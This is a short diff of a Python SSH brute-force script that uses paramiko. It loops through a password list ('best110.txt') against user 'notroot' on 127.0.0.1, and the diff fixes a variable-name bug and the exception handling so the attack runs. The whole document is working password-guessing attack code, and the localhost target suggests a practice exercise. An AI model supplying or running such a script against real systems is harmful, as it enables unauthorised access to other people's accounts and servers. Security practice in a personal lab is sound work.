@@ -5,7 +5,7 @@ host = "127.0.0.1"
 username = "notroot"
 attempts = 0
 
-with open("best110.txt", "r") as password: #opening password file
+with open("best110.txt", "r") as password_list: #opening password file
 	for password in password_list: #iterating over each password
 		password = password.strip("\n") #cleaning the password up
 		try:
@@ -17,6 +17,6 @@ with open("best110.txt", "r") as password: #opening password file
 				break #breaks the loop if a correct password is found
 			response.close() #closes the connection if an incorrect password is tried and the connection is reopened to try another password
 
-		except paramiko.ssh.exception.AuthenticationException:
+		except paramiko.AuthenticationException:
 			print("[X] Invalid password!")
 		attempts += 1
